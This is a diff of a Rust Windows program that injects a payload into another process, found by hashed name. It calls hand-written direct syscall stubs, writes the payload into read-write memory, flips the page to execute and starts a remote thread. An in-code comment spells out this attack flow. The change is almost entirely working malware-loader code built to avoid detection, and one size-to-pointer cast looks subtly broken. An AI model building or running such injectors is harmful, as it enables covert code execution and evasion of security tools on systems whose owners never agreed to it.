@@ -1,15 +1,16 @@
 #![allow(unused_mut, unused_assignments)]
-use std::ops::Deref;
+use std::{ops::Deref, thread::current};
 use std::os::raw::c_void;
 use std::ptr::null_mut;
 use core::arch::global_asm;
-use windows::{Wdk::Foundation::OBJECT_ATTRIBUTES, Win32::{
+use windows::{Wdk::Foundation::OBJECT_ATTRIBUTES, 
+    Win32::{
         Foundation::{CloseHandle, HANDLE, HWND, NTSTATUS},
         System::{
-            ProcessStatus::EnumProcesses,
+            Memory::{VirtualProtectEx, PAGE_PROTECTION_FLAGS}, ProcessStatus::EnumProcesses, 
             Threading::{PROCESS_ACCESS_RIGHTS, 
-                THREAD_ACCESS_RIGHTS, THREAD_ALL_ACCESS},
-            WindowsProgramming::CLIENT_ID,
+                THREAD_ACCESS_RIGHTS, THREAD_ALL_ACCESS}, 
+                WindowsProgramming::CLIENT_ID
         },
     }
 };
@@ -66,6 +67,11 @@ global_asm!("
         mov eax, 0x0C2
         syscall
         ret
+    nt_virtual_protect_ex_a:
+        mov r10, rcx
+        mov eax, 0x50
+        syscall
+        ret
 ");
 
 extern "C" {   
@@ -104,22 +110,29 @@ extern "C" {
     fn nt_create_thread_ex(
         handle_ptr: *mut HANDLE,            // [out] PHANDLE ThreadHandle,
         acces_mask: THREAD_ACCESS_RIGHTS,   // [in] ACCESS_MASK DesiredAccess,
-        obj_attributes: CCvoid,             // [in]opt_ POBJECT_ATTRIBUTES ObjectAttributes,
+        obj_attributes: CCvoid,             // [in] (opt) POBJECT_ATTRIBUTES ObjectAttributes,
         process_handle: HANDLE,             // [in] HANDLE ProcessHandle,
         start_routine: CCvoid,              // [in] PUSER_THREAD_START_ROUTINE StartRoutine,
-        arguments:  CCvoid,                 // [in]opt_ PVOID Argument,
+        arguments: CCvoid,                  // [in]opt_ PVOID Argument,
         create_flags: u32,                  // [in] ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
         zerobits: usize,                    // [in] SIZE_T ZeroBits,
         stack_size: usize,                  // [in] SIZE_T StackSize,
         stack_max: usize,                   // [in] SIZE_T MaximumStackSize,
         attribute_list: CCvoid,             // [in]opt_ PPS_ATTRIBUTE_LIST AttributeList
     ) -> NTSTATUS;
-
+    
+    fn nt_virtual_protect_ex_a(
+        process_handle: HANDLE,             // [in] HANDLE ProcessHandle,
+        base_address: PVoid,           // [in, out] PVOID *BaseAddress,
+        region_size: PUsize,                // [in, out] PSIZE_T RegionSize,
+        new_protection_flags: PAGE_PROTECTION_FLAGS,          // [in] ULONG NewProtect,
+        old_protection_flags: *mut PAGE_PROTECTION_FLAGS      // [out] PULONG OldProtect
+    ) -> NTSTATUS;
 }
 
 fn enumerate_processes() -> Result<Vec<usize>, windows::core::Error> {
-    let mut pids = vec![0u32; 1024];
-    let mut bytes_returned = 0u32;
+    let mut pids: Vec<u32> = vec![0u32; 1024];
+    let mut bytes_returned: u32 = 0u32;
     const SIZE_OF_U32: usize = std::mem::size_of::<u32>();
     unsafe {
         EnumProcesses(
@@ -130,7 +143,7 @@ fn enumerate_processes() -> Result<Vec<usize>, windows::core::Error> {
     }
     // Let's empty out the pids.
     pids.resize(bytes_returned as usize / SIZE_OF_U32, 0);
-    let pids_usize = pids.iter().map(|x| *x as usize).collect();
+    let pids_usize: Vec<usize> = pids.iter().map(|x: &u32| *x as usize).collect();
     Ok(pids_usize)
 }
 
@@ -271,6 +284,52 @@ fn nt_create_remote_thread_ex(handle: HANDLE, address: CCvoid) -> Result<(), NTS
     }
 }
 
+fn nt_virtual_protect_ex(handle: HANDLE, address: CCvoid, size: usize, flags: u32){
+    let mut old_flags = PAGE_PROTECTION_FLAGS(0x0);
+    let mut old_flags_ptr = &mut old_flags as *mut PAGE_PROTECTION_FLAGS;
+    let mut address: PVoid = address as PVoid;
+
+    unsafe {
+        let status = nt_virtual_protect_ex_a(
+            handle, 
+            address, 
+            size as PUsize, 
+            PAGE_PROTECTION_FLAGS(flags),
+            old_flags_ptr,
+        );
+        println!("NTSTATUS: {:#x}", status.0);
+        dbg!(old_flags);
+
+    }
+
+}
+
+
+fn virtual_protect_ex(handle: HANDLE, address: CCvoid, size: usize) {
+    let protection_flags = PAGE_PROTECTION_FLAGS(0x10); // Execute.
+    let mut old_protection_flags = PAGE_PROTECTION_FLAGS(0x0);
+    let mut old_protection_flags_ptr = &mut old_protection_flags as *mut PAGE_PROTECTION_FLAGS;
+    unsafe {
+        let status = VirtualProtectEx(
+            handle, 
+            address, 
+            size, 
+            protection_flags, 
+            old_protection_flags_ptr
+        );
+        dbg!(old_protection_flags);
+        dbg!(status);
+    }
+}
+
+// The current execution flow idea is as follows:
+// This program starts, it sleeps for 30 seconds.
+// After sleeping, it'll look for a specified process 
+// by matching hashed names against a hash.
+// If it finds the specified process, it'll allocate
+// a new block of WRITE space, where it´ll write and drop a payload.
+// Now, after sleeping for 10 seconds, this will turn the page to EXECUTE
+// and start the thread execution. Now, we close the handle(s) and continue our lives.
 
 
 fn main() {
@@ -304,12 +363,19 @@ fn main() {
     let current_process_handle = nt_get_handle(*current_process_pid.last().unwrap()).unwrap();
     //let current_process_handle = nt_get_handle(args[1].parse::<usize>().unwrap()).unwrap();
     // Let's allocate the required memory:
-    let addr_space = nt_virtual_alloc(*current_process_handle, None, Some(0x40), Some(payload.len())).unwrap();
+    
+    let addr_space = nt_virtual_alloc(*current_process_handle, None, Some(0x04), Some(payload.len())).unwrap();
     // Let's write the buffer:
     nt_write_process_memory(*current_process_handle, addr_space as usize, payload.to_vec());
 
-    //create_thread_ex(*current_process_handle, addr_space as usize); 
+    //virtual_protect_ex(*current_process_handle, addr_space, payload.len());
+    nt_virtual_protect_ex(*current_process_handle, addr_space, payload.len(), 0x10);
+
     nt_create_remote_thread_ex(*current_process_handle, addr_space);
+    // Sleep to make sure the injection was succesful.
+    use std::{thread, time};
+    let ten_millis = time::Duration::from_millis(100);
+    thread::sleep(ten_millis);
 
     /*
     let variable_to_read = 100u8;
